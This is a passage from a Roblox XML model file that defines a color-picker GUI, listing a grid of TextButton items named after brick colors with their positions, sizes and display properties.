									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>205</XO>
										<YS>0</YS>
										<YO>205</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBX9B03565DDBBC4F338A30036F11BAB02A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288986439</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Br. yellowish green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX50F54B9D723C481A8901F9DF7597735A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294298928</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright yellow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXEAAAC5612F0E4BEFBC6389272CB99B9E">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4292511041</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXAFBF0669C38C47C085DFEB22315EAC25">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4291045404</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright red</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX021971B916F14B7686403B26B4FF917F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright violet</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXB3F5620B59794B57B3A5D42877A96044">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4279069100</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXC7C1025F452747688C65CB4085A652B2">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278226844</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright bluish green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX61C42400B7DC470D8FE4284B9C301A37">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283144011</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Bright green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX084152D047494D0E83ABC1DA52D6B34B">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294506744</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Institutional white</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX84A2277023D047E1ADD895965F673E20">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294112243</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">White</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX59D495755E5042F0A728741B77BECC68">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4293256415</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Light stone grey</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX11B6D4AB595B4ECFB00953835F3BB572">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4291677645</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Mid gray</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX9460D638B67C45B0810B08A6C1D62BE9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Medium stone grey</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXE6CC579B170D4DAF8B8A21A53B4BB1AA">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4284702562</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Dark stone grey</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXBB13E2ED24C94AA78E80E2850697889B">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4279970357</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Black</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX57CEAB24C3F3431F984E6C7A5EFA9345">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Really black</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX7632850A1924445BBAA06B94302A5390">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4286549604</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Grime</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
